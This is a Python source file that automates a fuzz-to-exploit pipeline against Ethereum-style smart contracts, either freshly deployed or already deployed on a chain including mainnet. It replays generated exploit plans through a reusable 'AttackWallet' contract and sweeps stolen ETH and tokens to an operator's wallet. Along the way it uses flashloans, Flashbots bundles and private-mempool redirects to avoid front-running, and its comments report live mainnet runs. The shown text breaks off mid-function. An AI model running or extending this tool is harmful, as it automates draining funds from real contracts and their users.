#!/usr/bin/env python3
# Author: DanyTech
"""auto_pipeline.py -- fully automated register -> fund -> fuzz -> exploit ->
recover pipeline, driven from a single invocation.

The user supplies exactly one target identifier (a local .sol/.bin path to
deploy fresh, or an already-deployed contract's address) plus their own
"home" wallet address, where every recovered asset ends up regardless of
which key actually signs the on-chain transactions. Everything else --
registering/deploying the target, funding it, running the real forksploit
binary, detecting generated exploit plans, executing them, and sweeping
whatever was recovered back to the home wallet -- happens without further
input, and every step is logged to both the terminal and a timestamped log
file under onchain_scripts/logs/.

Exploit execution deliberately does NOT generate/compile/deploy a bespoke
Solidity contract per bug found. Instead it deploys ONE reusable
`AttackWallet` contract (onchain_scripts/contracts/AttackWallet.sol) a
single time ever, per chain, and replays the *.plan.json exploit plan
`forksploit`'s script_generator now emits alongside every generated
exploit script -- see that file's module doc and AttackWallet.sol's own
doc for why this is safer than a delegatecall/proxy "swap the logic"
design would have been.

Usage:
    python3 auto_pipeline.py \\
        --target /path/to/Vault.bin \\
        --recovery-wallet 0xYourMainWallet \\
        [--key key.txt] [--chain sepolia] [--fund-eth 0.01] \\
        [--fuzz-seconds 300] [--detectors all]

    python3 auto_pipeline.py \\
        --target 0xAlreadyDeployedContract \\
        --recovery-wallet 0xYourMainWallet
"""
import argparse
import json
import os
import re
import shutil
import tempfile
import subprocess
import sys
import time
from decimal import Decimal
from datetime import datetime, timezone
from dataclasses import asdict, dataclass, field
from pathlib import Path

from eth_abi import encode as abi_encode
from eth_account import Account
from web3 import Web3
from web3.exceptions import ContractLogicError, TimeExhausted

from chains import (
    AAVE_V3_POOLS, WETH_ADDRESSES, known_chains, get_rpc_url, make_w3, native_symbol_for_w3,
    require_mainnet_confirmation, verify_rpc_identity,
)
from flashbots_bundle import RELAY_URLS, call_bundle, submit_bundle_and_wait
from proxy_resolver import resolve_proxy_chain
from gas_utils import (
    GasBudget,
    GasBudgetExceeded,
    GasExceedsBlockLimitError,
    GasLedger,
    MAX_GAS_LIMIT,
    build_precise_tx,
    describe_actual_cost,
    estimate_gas_limit,
    format_wei_signed,
    gas_fit,
    get_fee_fields,
    net_profit_wei,
    tx_worst_case_price,
)
from wallet_policy import enforce_wallet_policy, register_contract
import strategy_layer

HERE = Path(__file__).parent
REPO_ROOT = HERE.parent
CONTRACTS_DIR = HERE / "contracts"
LOGS_DIR = HERE / "logs"

# Above this much value at risk on ETH mainnet, the exploit's whole
# protected sequence (armCallback + every execute step + disarmCallback)
# is submitted as ONE real Flashbots bundle (see flashbots_bundle.py --
# eth_sendBundle/eth_callBundle against the real relay, atomic
# all-or-nothing inclusion in a single block) instead of as separate
# public transactions. An earlier version of this just pointed
# send_raw_transaction at Flashbots Protect's RPC per-transaction, which
# only hides a transaction from the public mempool -- it does NOT close
# the window between a multi-step plan's separate transactions landing
# in separate blocks, which a real atomic bundle does.
#
# Flashbots itself is genuinely ETH-mainnet-only -- its auction is built
# on Ethereum's own MEV-Boost/proposer-builder-separation, which has no
# equivalent on BSC/Polygon/Arbitrum (checked, not assumed: Flashbots'
# own docs cover ETH mainnet only). But those chains aren't all left with
# nothing -- see PRIVACY_REDIRECT_RPC below for what's REALLY available
# on each, verified rather than guessed.
FLASHBOTS_THRESHOLD_ETH = 10.0
# Single-transaction mempool-privacy redirects verified to genuinely
# exist and work with zero signup, for chains Flashbots itself doesn't
# cover. NOT atomic bundles (unlike the eth path above) -- each
# protected step is still submitted as its own transaction, just through
# a provider that keeps it off the public mempool before inclusion,
# exactly like the single-tx Flashbots Protect redirect this file used
# before it was upgraded to real bundles for ETH.
#   - bsc: bloXroute's Protect RPC (bsc.rpc.blxrbdn.com) -- confirmed
#     live, no API key or Authorization header: a real signed
#     eth_sendRawTransaction got a normal node-level response
#     ("insufficient funds", i.e. it was actually processed) with no
#     auth rejection. bloXroute's BSC bundle API also exists but needs a
#     paid Professional-plan account, so that is NOT wired in here --
#     only the free, genuinely no-signup single-tx redirect is.
#   - polygon: bloXroute's Polygon private-tx path requires a paid,
#     authenticated account (checked their docs: it needs an
#     Authorization header tied to a prepaid balance) -- not a free
#     drop-in, so deliberately not added without real credentials to
#     wire in. Polygon's own official "Private Mempool" (launched April
#     2026) may have a free tier, but no exact endpoint URL could be
#     confirmed from official docs -- not guessed into existence here.
#   - arbitrum: deliberately absent, not an oversight -- Arbitrum's
#     sequencer gives EVERY transaction private-mempool protection by
#     default, network-wide, with no separate RPC or opt-in needed (its
#     own docs: "all Arbitrum chains have [a private mempool] by
#     default"). There is nothing for this mechanism to add there.
PRIVACY_REDIRECT_RPC = {
    "bsc": {"url": "https://bsc.rpc.blxrbdn.com", "threshold_native": 50.0},
}
# Generous, fixed gas limit for every transaction inside a bundle.
# Per-step eth_estimateGas (what build_precise_tx uses for the normal,
# non-bundled path) is NOT reliable here: it simulates against CURRENT
# on-chain state, but a later step in the sequence (e.g. "execute step"
# after "armCallback") only behaves correctly once an EARLIER, not-yet-
# landed step in the SAME bundle has already applied -- there is no
# "unused gas limit" cost (gas_utils.py's own documented principle: you
# only ever pay for gas actually USED), so a generous fixed ceiling costs
# nothing and avoids that whole problem.
BUNDLE_GAS_LIMIT = 2_000_000
# Builder tip for the atomic-bundle path, in basis points of AttackWallet's
# REAL on-chain balance at the moment the sweep runs (paid to
# block.coinbase atomically -- see AttackWallet.sol's sweepWithBuilderTip,
# which computes this from the real resulting balance, never an off-chain
# profit guess). 400 bps = 4%, the middle of the 3-5% range this was asked
# for. Capped server-side too (AttackWallet.MAX_BUILDER_TIP_BPS = 1000).
BUNDLE_BUILDER_TIP_BPS = 400


def bundle_relay_for(chain: str) -> "str | None":
    """The Flashbots relay URL for `chain`, or None when the chain has no
    Flashbots coverage. Flashbots' auction exists only on Ethereum's own
    MEV-Boost chains, so flashbots_bundle.RELAY_URLS is the authoritative
    coverage table (eth + sepolia) -- a chain absent from it has no relay,
    and the caller must fall back to the plain sequential path rather than
    KeyError-ing on a chain Flashbots never covered."""
    return RELAY_URLS.get(chain)


# Hard per-plan ceiling on the funding wallet's own gas spending (see
# gas_utils.GasBudget): one plan gets ONE bounded budget -- a REAL
# estimate for THIS plan specifically, computed before any real send,
# times this margin -- never unbounded spending across however many
# transactions it ends up taking. 0.10 matches gas_utils.py's own
# DEFAULT_GAS_LIMIT_MARGIN headroom convention.
GAS_BUDGET_MARGIN = 1.10
# Multiplier applied to a tx's fee fields when re-sending at a nonce that
# already holds an un-mined tx (see send_call's TimeExhausted path). geth
# rejects a same-nonce replacement priced less than ~10% higher, so 1.15
# clears that threshold on both legacy (ETC) and EIP-1559 chains.
REPLACEMENT_FEE_BUMP = 1.15
# How many times to reprice-and-retry a send the node rejects as an
# underpriced replacement (see send_call). Three attempts covers the
# market price having dropped since a stuck tx was sent without letting a
# pathological case retry forever.
REPLACEMENT_MAX_ATTEMPTS = 3
ATTACK_WALLET_REGISTRY = HERE / "attack_wallets.json"

# ---- Pre-flight profitability gate -------------------------------------
# A plan is only worth sending for real if it can be shown, for free and
# before any tx is signed, to leave the recovery wallet better off than
# the gas it costs. Confirmed live on ETC mainnet (2026-11-07): 10 of 11
# plans ran cleanly and moved zero value; a single one of them burned
# 7,878,136 gas (~0.0206 ETC) doing it. Both facts were already knowable
# from free reads -- the plan's own metadata and a fork simulation -- so
# every real send in that run was avoidable. Two layers, cheapest first:
#
#   1. A metadata filter (no network, no fork): skips plans that cannot
#      be replayed by AttackWallet at all (atomic_replayable False, or a
#      trace spanning multiple distinct callers), which the fuzzer
#      already stamps on every plan.json.
#   2. A fork simulation: replays the exact step sequence against a
#      throwaway Anvil fork of the SAME node state, measures the recovery
#      wallet's real balance delta and the real gas cost, and only lets
#      the plan through if delta > cost.
#
# Layer 2 is skipped (falls back to "attempt it") whenever Anvil is not
# installed or the fork cannot be started -- a missing optional tool must
# never make the pipeline refuse to run, only make it less thrifty.
FORK_SIM_ENABLED_DEFAULT = True
# Port for the throwaway Anvil fork. Deliberately different from the
# common 8545/8555 so it can never collide with a user's own node or a
# manual `anvil --fork-url ... --port 8555` left running.
FORK_SIM_PORT = 18545
# Anvil's ETC workaround: ETC skipped the Merge EIPs, so it never emits
# the post-Cancun blob-gas header Anvil assumes under its default
# `--hardfork latest`; every eth_call/eth_estimateGas then fails with
# "Excess blob gas not set." (see skills/forksploit-contract-audit/
# SKILL.md, PHASE 2). `shanghai` is the closest real match to ETC's
# current Spiral hardfork.
FORK_SIM_ETC_HARDFORK = "shanghai"
# How long to wait for the Anvil fork to answer eth_chainId before
# giving up and running without the gate.
FORK_SIM_STARTUP_TIMEOUT_S = 20.0

ERC20_TRANSFER_SELECTOR = "a9059cbb"


class Tee:
    """Mirrors every print() to both the terminal and a log file, so a
    fully automated run still leaves a complete, readable transcript --
    the "z vsemi logi" (with all logs) requirement: nobody is watching an
    unattended run live, so the terminal alone isn't enough.
    """

    def __init__(self, log_path: Path):
        LOGS_DIR.mkdir(parents=True, exist_ok=True)
        self._fh = open(log_path, "w", buffering=1)

    def log(self, msg: str = "", alert: bool = False) -> None:
        prefix = "!!! ALERT !!! " if alert else ""
        line = f"[{datetime.now(timezone.utc).isoformat(timespec='seconds')}] {prefix}{msg}"
        print(line)
        self._fh.write(line + "\n")

    def close(self) -> None:
        self._fh.close()


def parse_pretty_wei(value_str) -> int:
    """Mirrors the Rust `parse_pretty_wei` fix (src/evm/utils.rs):
    plan.json's per-step/total `value` fields come from `prettify_value`,
    which renders anything above 0.001 ETH as "<int>[.<fraction>] ether"
    (a valid Solidity numeric literal) rather than a plain wei integer.
    `Decimal` keeps this exact (no float rounding) regardless of how many
    of the up-to-18 fractional digits are present.
    """
    s = (value_str or "").strip()
    if not s:
        return 0
    if s.endswith(" ether"):
        return int(Decimal(s[: -len(" ether")]) * Decimal(10) ** 18)
    return int(s)


# Without --evm-version cancun, solc rejects transient-storage opcodes
# (tstore/tload, EIP-1153) that are common in modern reentrancy-guard
# patterns -- confirmed live: "Function 'tstore' not found" without this
# flag, clean compile with it. The Rust/revm side already executes
# Cancun opcodes fine (src/evm/host.rs defaults to SpecId::LATEST), so
# this was purely a missing solc flag here, not an engine limitation.
SOLC_EVM_VERSION = "cancun"
# Without --via-ir, any contract that hits solc's legacy codegen stack
# limit (a handful of combined local uint256 locals is enough -- not a
# contrived edge case, real DeFi math routinely has this many) fails
# outright with "Stack too deep. Try compiling with --via-ir" instead of
# compiling. --via-ir works standalone, without also needing --optimize.
# `--evm-version cancun` is only accepted by solc >= 0.8.24; older
# compilers exit 64 with "Invalid option for --evm-version: cancun".
# `_find_solc()` can legitimately resolve to an older solc (a stale
# ~/.svm pin, or the PATH fallback), so the version is PROBED against the
# actual binary and the newest supported one is used -- a hardcoded
# "cancun" would otherwise turn any such machine into an instant,
# confusing exit-64 crash before a single exploit step ever ran.
_SOLC_EVM_FALLBACKS = ["cancun", "shanghai", "paris", "london"]


def _solc_supports_evm_version(solc: str, version: str) -> bool:
    """Probes a real (tiny) compile -- `solc --version` alone short-circuits
    before validating --evm-version and reports success for anything."""
    with tempfile.TemporaryDirectory() as tmp:
        probe = Path(tmp) / "probe.sol"
        probe.write_text("contract A {}")
        result = subprocess.run(
            [solc, str(probe), "--bin", "--evm-version", version, "-o", tmp],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0


def _solc_extra_flags(solc: str | None = None) -> list[str]:
    solc = solc or _find_solc()
    evm_version = next(
        (v for v in _SOLC_EVM_FALLBACKS if _solc_supports_evm_version(solc, v)),
        None,
    )
    if evm_version is None:
        print(
            f"WARNING: {solc} supports none of {_SOLC_EVM_FALLBACKS} -- omitting "
            "--evm-version (contracts using tstore/tload will fail to compile)."
        )
        return ["--via-ir"]
    if evm_version != SOLC_EVM_VERSION:
        print(
            f"WARNING: {solc} does not support --evm-version {SOLC_EVM_VERSION} "
            f"(needs solc >= 0.8.24); falling back to {evm_version}."
        )
    return ["--evm-version", evm_version, "--via-ir"]


def _find_solc() -> str:
    pinned = Path.home() / ".svm" / "0.8.24" / "solc-0.8.24"
    if pinned.exists():
        # The pin is only trusted if it IS 0.8.24 -- a stale/hand-copied
        # file at that exact path silently broke every compile with
        # "Invalid option for --evm-version: cancun" (exit 64) before this
        # check, because nothing verified the version the path promised.
        version = subprocess.run(
            [str(pinned), "--version"], capture_output=True, text=True
        ).stdout
        if "0.8.24" in version:
            return str(pinned)
        print(
            f"WARNING: {pinned} exists but is NOT solc 0.8.24 (reports: {version.strip() or 'unknown'}). "
            "Ignoring it and falling back to 'solc' on PATH."
        )
    else:
        print(
            f"WARNING: pinned solc not found at {pinned} -- falling back to 'solc' on PATH, "
            "whatever version that happens to be (confirmed on this project's own dev machine: "
            "the PATH fallback resolves to solc 0.5.16, a 2019-era compiler with none of the "
            "0.8.x syntax used by this project's own contracts). Compilation will likely fail "
            "with a confusing solc syntax error rather than a clear version mismatch message."
        )
    return "solc"


def _load_json(path: Path, default):
    if not path.exists():
        return default
    try:
        return json.loads(path.read_text())
    except (json.JSONDecodeError, OSError):
        return default


def _save_json(path: Path, data) -> None:
    path.write_text(json.dumps(data, indent=2))


def compile_contract(sol_or_bin_path: Path, tee: Tee) -> bytes:
    """Returns ready-to-deploy init bytecode. If given a .bin, reads it
    directly; if given a .sol, compiles it with the pinned solc first.
    """
    if sol_or_bin_path.suffix == ".bin":
        hexcode = sol_or_bin_path.read_text().strip()
    elif sol_or_bin_path.suffix == ".sol":
        tee.log(f"Compiling {sol_or_bin_path} ...")
        out_dir = sol_or_bin_path.parent
        result = subprocess.run(
            [_find_solc(), str(sol_or_bin_path), "--bin", *_solc_extra_flags(), "--overwrite", "-o", str(out_dir)],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            tee.log(f"solc STDERR:\n{result.stderr}")
            raise RuntimeError(f"compilation failed for {sol_or_bin_path}")
        bin_path = out_dir / f"{sol_or_bin_path.stem}.bin"
        hexcode = bin_path.read_text().strip()
    else:
        raise ValueError(f"unsupported target file extension: {sol_or_bin_path.suffix} (need .sol or .bin)")
    if hexcode.startswith("0x"):
        hexcode = hexcode[2:]
    return bytes.fromhex(hexcode)


def deploy(w3: Web3, acct, nonce_box: dict, data: bytes, tee: Tee, label: str, value: int = 0,
           chain: str | None = None, gas_ledger: "GasLedger | None" = None) -> str:
    tx = build_precise_tx(
        w3,
        {
            "from": acct.address,
            "nonce": nonce_box["nonce"],
            "data": data,
            "value": value,
            "chainId": w3.eth.chain_id,
        },
        chain=chain,
    )
    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    tee.log(f"{label}: sent deploy tx {tx_hash.hex()} (gas limit {tx['gas']})")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
    nonce_box["nonce"] += 1
    if gas_ledger is not None:
        gas_ledger.record(receipt)
    if receipt.status != 1:
        raise RuntimeError(f"{label} deployment failed, tx {tx_hash.hex()}")
    tee.log(f"{label}: deployed at {receipt.contractAddress} -- {describe_actual_cost(w3, receipt)}")
    return receipt.contractAddress


def _nonce_has_pending_tx(w3: Web3, address: str, nonce: int) -> bool:
    """True when the node already knows about an un-mined tx at `nonce` --
    the node's pending count exceeds the nonce we are about to use. Read
    from the node, not from this process's own history, so a tx left stuck
    by an EARLIER run is detected too."""
    try:
        return w3.eth.get_transaction_count(address, "pending") > nonce
    except Exception:
        # Never let this probe be the reason a send fails; fall back to the
        # in-process signal (nonce_box["stuck_nonce"]) only.
        return False


def send_call(
    w3: Web3,
    acct,
    nonce_box: dict,
    to: str,
    data: bytes,
    tee: Tee,
    label: str,
    value: int = 0,
    submit_w3: "Web3 | None" = None,
    gas_budget: "GasBudget | None" = None,
    gas_ledger: "GasLedger | None" = None,
) -> bool:
    """`submit_w3`, when given (see PRIVACY_REDIRECT_RPC), is used ONLY
    for the actual send_raw_transaction call -- gas/nonce/signing still
    come from the real `w3`, and the receipt is still awaited on it too
    (once included, any RPC can see it). This is a single-tx mempool-
    privacy redirect, NOT an atomic bundle -- see execute_plan's own
    comments for which chains get which mechanism and why.

    `gas_budget`, when given, is a hard per-plan circuit breaker (see
    gas_utils.GasBudget): this call's worst-case cost is reserved BEFORE
    signing/sending, raising GasBudgetExceeded (left to propagate --
    never caught here) instead of sending if that would exceed the
    plan's budget, then reconciled with the real receipt cost after."""
    tx = build_precise_tx(
        w3,
        {
            "from": acct.address,
            "to": Web3.to_checksum_address(to),
            "nonce": nonce_box["nonce"],
            "data": data,
            "value": value,
            "chainId": w3.eth.chain_id,
        },
    )
    # If an earlier tx at this same nonce is still sitting in the mempool,
    # geth rejects a replacement priced less than ~10% higher
    # ("replacement transaction underpriced"). Bump the price so this send
    # actually replaces it instead of being rejected -- without this, every
    # later plan at this nonce fails and the run can never make progress.
    # Two signals, deliberately: the in-process one (nonce_box["stuck_nonce"],
    # set when a send in THIS run timed out) AND the node's own pending count,
    # because a tx left stuck by an EARLIER crashed run is invisible to
    # nonce_box -- nonce_box starts from get_transaction_count(addr) (latest,
    # not pending), so it would not know nonce 164 already holds a stuck tx.
    stuck = nonce_box.get("stuck_nonce") == nonce_box["nonce"]
    if not stuck and _nonce_has_pending_tx(w3, acct.address, nonce_box["nonce"]):
        stuck = True
    if stuck:
        bump = REPLACEMENT_FEE_BUMP
        for key in ("gasPrice", "maxFeePerGas", "maxPriorityFeePerGas"):
            if key in tx:
                tx[key] = int(tx[key] * bump)
        tee.log(f"{label}: nonce {nonce_box['nonce']} already holds an un-mined tx -- repricing this send by {bump}x to replace it.")
    sender = submit_w3 if submit_w3 is not None else w3
    # Send, retrying on the node's "replacement transaction underpriced"
    # rejection. The upfront bump above covers a stuck tx we already know
    # about; this covers the case where the market price dropped since it
    # was sent, so even a bumped tx is still under the node's floor. Each
    # retry re-reserves the (now higher) worst case and releases the
    # previous reservation, so the budget reflects what will actually be
    # signed rather than leaking a reservation per attempt.
    for attempt in range(REPLACEMENT_MAX_ATTEMPTS):
        worst_case_wei = tx["gas"] * tx_worst_case_price(tx)
        if gas_budget is not None:
            gas_budget.reserve(worst_case_wei, label)
        signed = acct.sign_transaction(tx)
        try:
            tx_hash = sender.eth.send_raw_transaction(signed.raw_transaction)
            break
        except Exception as e:
            if gas_budget is not None:
                gas_budget.release(worst_case_wei)
            if "underpriced" not in str(e).lower() or attempt == REPLACEMENT_MAX_ATTEMPTS - 1:
                raise
            for key in ("gasPrice", "maxFeePerGas", "maxPriorityFeePerGas"):
                if key in tx:
                    tx[key] = int(tx[key] * REPLACEMENT_FEE_BUMP)
            tee.log(
                f"{label}: node rejected this send as an underpriced replacement at nonce {nonce_box['nonce']} "
                f"-- repricing by another {REPLACEMENT_FEE_BUMP}x and retrying (attempt {attempt + 2}/{REPLACEMENT_MAX_ATTEMPTS}).",
                alert=True,
            )
    tee.log(f"{label}: sent tx {tx_hash.hex()}" + (" (via privacy redirect)" if submit_w3 is not None else ""))
    try:
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
    except TimeExhausted:
        # A tx that never lands must not abort the whole run (confirmed
        # live on ETC mainnet: one un-includable tx -- see
        # gas_utils.MAX_GAS_LIMIT -- raised TimeExhausted and killed a run
        # that had 1945 more plans to try). Report it as a clean
        # NOT_CONFIRMED for THIS plan instead, and do NOT advance the
        # nonce: the stuck tx still occupies this nonce on-chain, so the
        # next tx must reuse it (a fresh send at the same nonce replaces
        # the stuck one) rather than queue behind a gap it can never fill.
        tee.log(
            f"{label}: tx {tx_hash.hex()} did not land within 180s -- treating this plan as NOT CONFIRMED. "
            "This usually means the tx is un-includable as sent (e.g. gas limit above the block's own). "
            "The wallet's nonce is NOT advanced, so a later step can replace it.",
            alert=True,
        )
        # Remember this nonce so the NEXT send at it reprices (see
        # REPLACEMENT_FEE_BUMP above) -- otherwise it is rejected as an
        # underpriced replacement and no later plan can ever progress.
        nonce_box["stuck_nonce"] = nonce_box["nonce"]
        return False
    nonce_box.pop("stuck_nonce", None)
    nonce_box["nonce"] += 1
    if gas_ledger is not None:
        gas_ledger.record(receipt)
    if gas_budget is not None:
        gas_budget.settle(worst_case_wei, receipt["gasUsed"] * receipt.get("effectiveGasPrice", 0))
    ok = receipt.status == 1
    tee.log(f"{label}: status={'OK' if ok else 'REVERTED'} -- {describe_actual_cost(w3, receipt)}")
    return ok


def sign_step(w3: Web3, acct, nonce: int, to: str, data: bytes, value: int, fee_fields: dict) -> tuple:
    """Builds and signs (never sends) one step of a Flashbots bundle.
    Returns (raw_tx_hex, tx_hash_hex). Every tx in a bundle must be
    signed up front, before any of them are submitted -- that's the
    whole point of atomic inclusion -- so this deliberately never calls
    send_raw_transaction itself; see execute_plan's bundle path and
    flashbots_bundle.submit_bundle_and_wait for what happens with the
    result. The bundle's gas budget (see gas_utils.GasBudget) is checked
    once, upfront, in execute_plan itself -- using the atomic bundle's
    own real eth_callBundle simulation, not a per-step worst case here.

    Found live (2026-11-02, while first actually exercising this
    function end-to-end for the flashloan-bundle path): naively splatting
    **fee_fields here leaks its own "is_legacy" key straight into the tx
    dict, which eth_account's sign_transaction rejects outright
    ("Transaction had invalid fields: {'is_legacy': False}") -- this
    function had apparently never been run for real before. Same
    is_legacy/maxFeePerGas-vs-gasPrice dispatch as gas_utils.
    build_precise_tx now, instead of blindly spreading the whole dict."""
    tx = {
        "from": acct.address,
        "to": Web3.to_checksum_address(to),
        "nonce": nonce,
        "data": data,
        "value": value,
        "chainId": w3.eth.chain_id,
        "gas": BUNDLE_GAS_LIMIT,
    }
    if fee_fields["is_legacy"]:
        tx["gasPrice"] = fee_fields["gasPrice"]
    else:
        tx["maxFeePerGas"] = fee_fields["maxFeePerGas"]
        tx["maxPriorityFeePerGas"] = fee_fields["maxPriorityFeePerGas"]
        tx["type"] = 2
    signed = acct.sign_transaction(tx)
    raw_hex = signed.raw_transaction.hex()
    if not raw_hex.startswith("0x"):
        raw_hex = "0x" + raw_hex
    return raw_hex, signed.hash.hex()


def _read_attack_wallet_safe_wallet(w3: Web3, address: str) -> str:
    raw = w3.eth.call({"to": Web3.to_checksum_address(address), "data": selector("safeWallet()")})
    return Web3.to_checksum_address("0x" + raw[-20:].hex())


def get_or_deploy_attack_wallet(w3: Web3, acct, nonce_box: dict, chain: str, safe_wallet: str, tee: Tee) -> str:
    """The whole point of AttackWallet: deployed ONCE per chain, then
    reused forever after -- never redeployed just because a new exploit
    was found. It IS redeployed if AttackWallet.sol's own source has
    changed since the recorded instance went up (compared by runtime
    bytecode, not just "does something exist at this address") -- this
    project's own AttackWallet.sol gained Aave-flashloan support after an
    instance was already deployed and recorded, which is exactly the
    staleness this check now catches instead of silently reusing an
    instance that's missing a feature the current plan needs.

    `safe_wallet` is locked into the instance's own `safeWallet` storage
    slot (see AttackWallet.sol) the first time it's ever set -- every
    sweep function on that instance refuses to send anywhere else
    afterwards, even via a compromised owner key, since none of them
    accept a destination argument at all anymore. Reusing an EXISTING
    instance whose locked-in safeWallet does NOT match `safe_wallet` is
    refused outright here: proceeding anyway would mean either this run's
    profit goes somewhere other than what it was told, or (if the
    mismatch is actually a stale/wrong expectation on THIS run's side) it
    was never going to land at all -- guessing which case it is would be
    worse than just stopping and saying so.
    """
    sol_path = CONTRACTS_DIR / "AttackWallet.sol"
    subprocess.run(
        [_find_solc(), str(sol_path), "--bin", "--bin-runtime", *_solc_extra_flags(), "--overwrite", "-o", str(CONTRACTS_DIR)],
        check=True,
        capture_output=True,
    )
    current_runtime = (CONTRACTS_DIR / "AttackWallet.bin-runtime").read_text().strip().lower().removeprefix("0x")
    safe_wallet = Web3.to_checksum_address(safe_wallet)

    registry = _load_json(ATTACK_WALLET_REGISTRY, {})
    existing = registry.get(chain)
    if existing:
        onchain_code = w3.eth.get_code(Web3.to_checksum_address(existing)).hex().lower().removeprefix("0x")
        if onchain_code == current_runtime:
            locked_safe_wallet = _read_attack_wallet_safe_wallet(w3, existing)
            if locked_safe_wallet == "0x0000000000000000000000000000000000000000":
                # Predates safeWallet existing at all -- lock it now
                # rather than leave an already-in-use instance unlocked.
                tee.log(f"Existing AttackWallet {existing} on {chain} predates safe-wallet locking -- locking it to {safe_wallet} now.")
                if not send_call(w3, acct, nonce_box, existing, attack_wallet_set_safe_wallet_calldata(safe_wallet), tee, "setSafeWallet (backfill)"):
                    raise SystemExit(f"Failed to lock AttackWallet {existing} to safe wallet {safe_wallet} -- aborting rather than proceed without this safety check.")
            elif locked_safe_wallet.lower() != safe_wallet.lower():
                raise SystemExit(
                    f"AttackWallet {existing} on {chain} is LOCKED to safe wallet {locked_safe_wallet}, but this run "
                    f"expects {safe_wallet} -- refusing to proceed. Any profit swept through this instance can ONLY "
                    f"ever reach {locked_safe_wallet}, never {safe_wallet}, no matter what argument is passed here -- "
                    "deploy a fresh AttackWallet (clear its entry in attack_wallets.json) if a different recovery "
                    "wallet is genuinely intended for this chain."
                )
            tee.log(f"Reusing existing AttackWallet on {chain}: {existing} (locked to safe wallet {safe_wallet})")
            return existing
        if len(onchain_code) == 0:
            tee.log(f"Recorded AttackWallet {existing} has no code on {chain} (wrong chain/reset?) -- redeploying.")
        else:
            tee.log(f"Recorded AttackWallet {existing}'s bytecode is stale (AttackWallet.sol changed since it was deployed) -- redeploying.")

    data = compile_contract(CONTRACTS_DIR / "AttackWallet.bin", tee)
    addr = deploy(w3, acct, nonce_box, data, tee, "AttackWallet", chain=chain)
    if not send_call(w3, acct, nonce_box, addr, attack_wallet_set_safe_wallet_calldata(safe_wallet), tee, "setSafeWallet"):
        raise SystemExit(f"Failed to lock newly-deployed AttackWallet {addr} to safe wallet {safe_wallet} -- aborting rather than leave it unlocked.")
    registry[chain] = addr
    _save_json(ATTACK_WALLET_REGISTRY, registry)
    return addr


def selector(name_and_types: str) -> bytes:
    from Crypto.Hash import keccak

    k = keccak.new(digest_bits=256)
    k.update(name_and_types.encode())
    return k.digest()[:4]


def encode_address(addr: str) -> bytes:
    return bytes(12) + bytes.fromhex(Web3.to_checksum_address(addr)[2:])


def encode_uint256(value: int) -> bytes:
    return value.to_bytes(32, "big")


def attack_wallet_execute_calldata(target: str, inner_calldata: bytes, value: int) -> bytes:
    # execute(address,bytes,uint256)
    offset = encode_uint256(0x60)
    data_len = len(inner_calldata)
    padded_len = (data_len + 31) // 32 * 32
    inner_padded = inner_calldata + b"\x00" * (padded_len - data_len)
    return (
        selector("execute(address,bytes,uint256)")
        + encode_address(target)
        + offset
        + encode_uint256(value)
        + encode_uint256(data_len)
        + inner_padded
    )


def attack_wallet_execute_batch_calldata(targets: list, datas: list, values: list) -> bytes:
    """W4: executeBatch(address[],bytes[],uint256[]) -- run the whole
    (target, data, value) sequence in ONE transaction, atomically. Same
    three-dynamic-array ABI shape as armFlashloanActions, so it reuses the
    vetted eth_abi encoder rather than the hand-rolled helpers (which only
    ever handled a single `bytes` tail)."""
    checksummed = [Web3.to_checksum_address(t) for t in targets]
    return selector("executeBatch(address[],bytes[],uint256[])") + abi_encode(
        ["address[]", "bytes[]", "uint256[]"], [checksummed, datas, values]
    )


def attack_wallet_arm_callback_calldata(target: str, inner_calldata: bytes) -> bytes:
    # armCallback(address,bytes)
    offset = encode_uint256(0x40)
    data_len = len(inner_calldata)
    padded_len = (data_len + 31) // 32 * 32
    inner_padded = inner_calldata + b"\x00" * (padded_len - data_len)
    return selector("armCallback(address,bytes)") + encode_address(target) + offset + encode_uint256(data_len) + inner_padded


def attack_wallet_disarm_callback_calldata() -> bytes:
    return selector("disarmCallback()")


def attack_wallet_set_safe_wallet_calldata(wallet: str) -> bytes:
    return selector("setSafeWallet(address)") + encode_address(wallet)


def attack_wallet_sweep_calldata() -> bytes:
    # No destination argument -- always the locked-in safeWallet, set once
    # via attack_wallet_set_safe_wallet_calldata (see get_or_deploy_attack_wallet).
    return selector("sweep()")


def attack_wallet_sweep_with_builder_tip_calldata(tip_bps: int) -> bytes:
    # Same no-destination-argument safety boundary as sweep() above.
    return selector("sweepWithBuilderTip(uint256)") + encode_uint256(tip_bps)


def attack_wallet_sweep_token_calldata(token: str, amount: int) -> bytes:
    # Same no-destination-argument safety boundary as sweep() above --
    # see try_sweep_stolen_tokens's own doc for why `amount` is read live
    # from AttackWallet's real balanceOf(token) immediately beforehand,
    # never guessed from the plan.
    return selector("sweepToken(address,uint256)") + abi_encode(["address", "uint256"], [Web3.to_checksum_address(token), amount])


def attack_wallet_arm_flashloan_actions_calldata(targets: list, datas: list, values: list) -> bytes:
    # armFlashloanActions(address[],bytes[],uint256[]) -- three dynamic
    # arrays (one of them itself variable-length elements) is exactly the
    # kind of ABI encoding this file's own hand-rolled encode_address/
    # encode_uint256 helpers were never meant for (see their own
    # docstrings -- they only ever handled a single dynamic `bytes` tail
    # at a fixed offset). eth_abi is already a direct dependency of this
    # project (aave_flashloan_runner.py already imports it) -- reusing a
    # vetted encoder here instead of hand-rolling a 3-dynamic-array ABI
    # layout is the safer choice for a call that arms what AttackWallet
    # will actually execute with borrowed funds.
    checksummed = [Web3.to_checksum_address(t) for t in targets]
    return selector("armFlashloanActions(address[],bytes[],uint256[])") + abi_encode(
        ["address[]", "bytes[]", "uint256[]"], [checksummed, datas, values]
    )


def attack_wallet_start_flashloan_calldata(pool: str, asset: str, amount: int, params: bytes = b"") -> bytes:
    # startFlashLoan(address,address,uint256,bytes)
    return selector("startFlashLoan(address,address,uint256,bytes)") + abi_encode(
        ["address", "address", "uint256", "bytes"],
        [Web3.to_checksum_address(pool), Web3.to_checksum_address(asset), amount, params],
    )


def revert_reason(w3: Web3, tx: dict) -> "str | None":
    """W4: ask the node to re-simulate a failed tx (`eth_call`) and return
    the decoded revert reason, so a NOT-CONFIRMED step names WHY it failed
    instead of just "reverted". Best-effort: any failure returns None and
    the caller falls back to its generic message. Never raises."""
    try:
        w3.eth.call(tx)
